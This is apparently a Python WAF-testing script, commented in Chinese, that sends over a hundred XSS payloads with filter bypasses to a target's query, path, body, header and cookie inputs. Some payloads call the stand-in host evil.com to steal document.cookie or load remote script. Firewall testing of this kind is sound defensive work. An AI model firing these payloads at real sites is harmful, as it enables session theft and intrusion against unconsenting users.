#!/usr/bin/env python3
"""
XSS (跨站脚本) 攻击测试脚本

覆盖注入点:
  - GET Query 参数
  - GET Path
  - POST JSON / Form / Raw
  - Header / Cookie
  - PUT / PATCH

Payload 来源: 反射型 XSS、存储型 XSS、DOM 型 XSS、各种绕过技巧、
              HTML5 新标签、SVG、MathML、事件处理器、编码绕过等。
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from test_base import WAFTestBase, parse_args, Colors


class XSSTester(WAFTestBase):
    ATTACK_NAME = "Cross-Site Scripting (XSS)"
    ATTACK_DESC = "XSS 攻击测试 — 覆盖反射型、存储型、DOM型，含多种标签与绕过技巧"

    GET_PAYLOADS = [
        # 基础 script 标签
        ("script-basic", "<script>alert(1)</script>"),
        ("script-src", "<script src='http://evil.com/xss.js'></script>"),
        ("script-evil", "<script>document.location='http://evil.com/?c='+document.cookie</script>"),
        ("script-prompt", "<script>prompt(1)</script>"),
        ("script-confirm", "<script>confirm(1)</script>"),
        ("script-eval", "<script>eval('alert(1)')</script>"),
        ("script-new-function", "<script>new Function('alert(1)')()</script>"),
        ("script-settimeout", "<script>setTimeout('alert(1)',0)</script>"),
        ("script-setinterval", "<script>setInterval('alert(1)',0)</script>"),

        # img 标签 + onerror
        ("img-onerror", "<img src=x onerror=alert(1)>"),
        ("img-onerror-single", "<img src=x onerror='alert(1)'>"),
        ("img-onload", "<img src=x onload=alert(1)>"),
        ("img-onerror-js", "<img src=x onerror=javascript:alert(1)>"),
        ("img-src-data", "<img src='data:image/svg+xml;base64,PHN2Zy...'>"),

        # 其他 HTML 标签 + 事件
        ("body-onload", "<body onload=alert(1)>"),
        ("svg-onload", "<svg onload=alert(1)>"),
        ("svg-onload-2", "<svg/onload=alert(1)>"),
        ("svg-script", "<svg><script>alert(1)</script></svg>"),
        ("math-onload", "<math href='javascript:alert(1)'>CLICKME</math>"),
        ("iframe-src", "<iframe src='javascript:alert(1)'></iframe>"),
        ("iframe-srcdoc", "<iframe srcdoc='<script>alert(1)</script>'></iframe>"),
        ("object-data", "<object data='javascript:alert(1)'></object>"),
        ("embed-src", "<embed src='javascript:alert(1)'>"),
        ("form-action", "<form action='javascript:alert(1)'><button>Submit</button></form>"),
        ("input-onfocus", "<input onfocus=alert(1) autofocus>"),
        ("input-onblur", "<input onblur=alert(1) autofocus><input>"),
        ("video-onerror", "<video src=x onerror=alert(1)>"),
        ("audio-onerror", "<audio src=x onerror=alert(1)>"),
        ("source-onerror", "<source src=x onerror=alert(1)>"),
        ("track-onerror", "<track src=x onerror=alert(1)>"),
        ("details-ontoggle", "<details open ontoggle=alert(1)>"),
        ("select-onchange", "<select onchange=alert(1)><option>1</option><option>2</option></select>"),
        ("textarea-onfocus", "<textarea onfocus=alert(1) autofocus></textarea>"),
        ("marquee-onstart", "<marquee onstart=alert(1)>XSS</marquee>"),
        ("a-href-js", "<a href='javascript:alert(1)'>CLICK</a>"),
        ("a-href-data", "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>CLICK</a>"),

        # javascript: 伪协议
        ("js-protocol", "javascript:alert(1)"),
        ("js-protocol-enc", "jav&#x61;script:alert(1)"),
        ("js-protocol-2", "javascript://evil.com/%0Aalert(1)"),

        # 编码绕过
        ("enc-html-entity", "&lt;script&gt;alert(1)&lt;/script&gt;"),
        ("enc-hex", "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>"),
        ("enc-decimal", "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"),
        ("enc-url", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        ("enc-double-url", "%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
        ("enc-base64", "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
        ("enc-unicode", "\u003cscript\u003ealert(1)\u003c/script\u003e"),

        # 大小写混合 / 标签变形
        ("case-mix", "<ScRiPt>alert(1)</ScRiPt>"),
        ("tag-space", "< script >alert(1)</ script >"),
        ("tag-null", "<scr\x00ipt>alert(1)</scr\x00ipt>"),
        ("tag-backslash", "<scr\\ipt>alert(1)</scr\\ipt>"),
        ("tag-fake-close", "<script/xss>alert(1)</script/xss>"),
        ("tag-namespace", "<x:script>alert(1)</x:script>"),

        # 事件处理器大全
        ("event-onerror", "<img src=x onerror=alert(1)>"),
        ("event-onmouseover", "<div onmouseover=alert(1)>HOVER</div>"),
        ("event-onclick", "<button onclick=alert(1)>CLICK</button>"),
        ("event-ondblclick", "<button ondblclick=alert(1)>DBLCLICK</button>"),
        ("event-onkeypress", "<input onkeypress=alert(1)>"),
        ("event-onkeydown", "<input onkeydown=alert(1)>"),
        ("event-onkeyup", "<input onkeyup=alert(1)>"),
        ("event-onmouseenter", "<div onmouseenter=alert(1)>ENTER</div>"),
        ("event-onmouseleave", "<div onmouseleave=alert(1)>LEAVE</div>"),
        ("event-onmousemove", "<div onmousemove=alert(1)>MOVE</div>"),
        ("event-onmousedown", "<div onmousedown=alert(1)>DOWN</div>"),
        ("event-onmouseup", "<div onmouseup=alert(1)>UP</div>"),
        ("event-onsubmit", "<form onsubmit=alert(1)><button>Submit</button></form>"),
        ("event-onreset", "<form onreset=alert(1)><button>Reset</button></form>"),
        ("event-onselect", "<input onselect=alert(1) value='SELECT ME'>"),
        ("event-ondrag", "<div draggable=true ondrag=alert(1)>DRAG</div>"),
        ("event-ondrop", "<div ondrop=alert(1)>DROP</div>"),
        ("event-oncopy", "<div oncopy=alert(1)>COPY</div>"),
        ("event-oncut", "<div oncut=alert(1)>CUT</div>"),
        ("event-onpaste", "<div onpaste=alert(1)>PASTE</div>"),
        ("event-oncontextmenu", "<div oncontextmenu=alert(1)>RIGHT CLICK</div>"),
        ("event-onwheel", "<div onwheel=alert(1)>SCROLL</div>"),
        ("event-onresize", "<body onresize=alert(1)>"),
        ("event-onpageshow", "<body onpageshow=alert(1)>"),
        ("event-onhashchange", "<body onhashchange=alert(1)>"),
        ("event-onmessage", "<body onmessage=alert(1)>"),
        ("event-onerror-img", "<img src=x onerror=alert(1)>"),
        ("event-onerror-video", "<video src=x onerror=alert(1)>"),
        ("event-onerror-audio", "<audio src=x onerror=alert(1)>"),
        ("event-onerror-source", "<source src=x onerror=alert(1)>"),

        # 模板注入 / Angular / Vue
        ("angular", "{{constructor.constructor('alert(1)')()}}"),
        ("angular-ng", "<img src=x ng-app ng-csp ng-click=$event.view.alert(1)>"),
        ("vue", "{{_c.constructor('alert(1)')()}}"),
        ("vue-v-html", "<div v-html=\"'<script>alert(1)</script>'\"></div>"),
        ("react-danger", "<div dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}} />"),

        # DOM XSS
        ("dom-hash", "#<img src=x onerror=alert(1)>"),
        ("dom-eval", "eval(alert(1))"),
        ("dom-document-write", "document.write('<script>alert(1)</script>')"),
        ("dom-innerHTML", "element.innerHTML='<img src=x onerror=alert(1)>'"),
        ("dom-location", "document.location='javascript:alert(1)'"),

        # 协议绕过
        ("protocol-data", "data:text/html,<script>alert(1)</script>"),
        ("protocol-vbscript", "vbscript:msgbox(1)"),
        ("protocol-mocha", "mocha:[alert(1)]"),
        ("protocol-livescript", "livescript:alert(1)"),

        # 特殊 Payload
        ("special-backtick", "<img src=`x` onerror=alert(1)>"),
        ("special-paren", "<script>(alert)(1)</script>"),
        ("special-bracket", "<script>window['alert'](1)</script>"),
        ("special-atob", "<script>eval(atob('YWxlcnQoMSk='))</script>"),
        ("special-String-fromCharCode", "<script>alert(String.fromCharCode(88,83,83))</script>"),
        ("special-iframe-js", "<iframe src=javascript:alert(1)>"),
        ("special-style-import", "<style>@import url('javascript:alert(1)')</style>"),
        ("special-link-stylesheet", "<link rel=stylesheet href='javascript:alert(1)'>"),
        ("special-meta-refresh", "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>"),
        ("special-table-bg", "<table background='javascript:alert(1)'>"),
        ("special-td-bg", "<td background='javascript:alert(1)'>"),
        ("special-body-bg", "<body background='javascript:alert(1)'>"),
        ("special-input-dyn", "<input type=image src=x onerror=alert(1)>"),
        ("special-isindex", "<isindex action=javascript:alert(1)>"),
        ("special-frameset", "<frameset onload=alert(1)>"),
        ("special-frame", "<frame src='javascript:alert(1)'>"),
        ("special-applet", "<applet code='javascript:alert(1)'>"),

        # 基于 CSS 的 XSS
        ("css-expression", "<div style='x:expression(alert(1))'>"),
        ("css-moz-binding", "<div style='-moz-binding:url(http://evil.com/xss.xml)'>"),
        ("css-import", "<style>@import 'javascript:alert(1)'</style>"),
        ("css-link", "<link rel=stylesheet href='javascript:alert(1)'>"),
    ]

    POST_PAYLOADS = [
        ("json-script", "<script>alert(1)</script>"),
        ("json-img", "<img src=x onerror=alert(1)>"),
        ("json-svg", "<svg onload=alert(1)>"),
        ("json-angular", "{{constructor.constructor('alert(1)')()}}"),
        ("json-body-onload", "<body onload=alert(1)>"),
        ("json-a-href", "<a href='javascript:alert(1)'>CLICK</a>"),
        ("json-iframe", "<iframe src='javascript:alert(1)'></iframe>"),
        ("json-object", "<object data='javascript:alert(1)'></object>"),
        ("json-details", "<details open ontoggle=alert(1)>"),
        ("json-marquee", "<marquee onstart=alert(1)>XSS</marquee>"),
        ("json-video", "<video src=x onerror=alert(1)>"),
        ("json-math", "<math href='javascript:alert(1)'>CLICKME</math>"),
        ("json-onerror", "<img src=x onerror=alert(1)>"),
        ("json-onfocus", "<input onfocus=alert(1) autofocus>"),
        ("json-meta", "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>"),

        ("form-script", "<script>alert('XSS')</script>"),
        ("form-img", "<img src=x onerror=alert('XSS')>"),
        ("form-svg", "<svg onload=alert('XSS')>"),
        ("form-iframe", "<iframe srcdoc='<script>alert(1)</script>'></iframe>"),
        ("form-details", "<details open ontoggle=alert(1)>"),
    ]

    HEADER_PAYLOADS = [
        ("hdr-referer", "http://evil.com/<script>alert(1)</script>"),
        ("hdr-ua", "Mozilla/5.0 <script>alert(1)</script>"),
        ("hdr-accept", "text/html,<script>alert(1)</script>"),
        ("hdr-xff", "127.0.0.1 <script>alert(1)</script>"),
    ]

    COOKIE_PAYLOADS = [
        ("cookie-script", "<script>alert(1)</script>"),
        ("cookie-img", "<img src=x onerror=alert(1)>"),
        ("cookie-svg", "<svg onload=alert(1)>"),
    ]

    PATH_PAYLOADS = [
        ("path-script", "<script>alert(1)</script>"),
        ("path-img", "<img src=x onerror=alert(1)>"),
        ("path-svg", "<svg onload=alert(1)>"),
        ("path-iframe", "<iframe src=javascript:alert(1)>"),
    ]

    def run(self):
        print(f"  {Colors.c('正在执行 XSS 测试...', Colors.INFO)}\n")

        print(f"  {Colors.c('[注入点] GET Query', Colors.CYAN)}")
        for name, payload in self.GET_PAYLOADS:
            self.get_query(f"xss-get-{name}", payload, "/search", "q")

        print(f"  {Colors.c('[注入点] GET Path', Colors.CYAN)}")
        for name, payload in self.PATH_PAYLOADS:
            self.get_path(f"xss-path-{name}", payload, "/page")

        print(f"  {Colors.c('[注入点] POST JSON', Colors.CYAN)}")
        for name, payload in self.POST_PAYLOADS[:10]:
            self.post_json(f"xss-json-{name}", payload, "/api/comment", "content")

        print(f"  {Colors.c('[注入点] POST Form', Colors.CYAN)}")
        for name, payload in self.POST_PAYLOADS[10:]:
            self.post_form(f"xss-form-{name}", payload, "/api/comment", "content")

        print(f"  {Colors.c('[注入点] Header', Colors.CYAN)}")
        headers = ["Referer", "User-Agent", "Accept", "X-Forwarded-For"]
        for i, (name, payload) in enumerate(self.HEADER_PAYLOADS):
            h = headers[i % len(headers)]
            self.header_inject(f"xss-hdr-{name}", payload, h, "/api/echo")

        print(f"  {Colors.c('[注入点] Cookie', Colors.CYAN)}")
        for name, payload in self.COOKIE_PAYLOADS:
            self.cookie_inject(f"xss-cookie-{name}", payload, "/api/echo")

        print(f"  {Colors.c('[注入点] PUT / PATCH', Colors.CYAN)}")
        for name, payload in [("put-script", "<script>alert(1)</script>"),
                               ("put-img", "<img src=x onerror=alert(1)>")]:
            self.put_json(f"xss-put-{name}", payload, "/api/user/1", "bio")
            self.patch_json(f"xss-patch-{name}", payload, "/api/user/1", "bio")


if __name__ == "__main__":
    args = parse_args("XSS 攻击测试")
    tester = XSSTester(
        target=args.target, domain=args.domain,
        verbose=args.verbose, timeout=args.timeout, delay=args.delay
    )
    tester.execute()
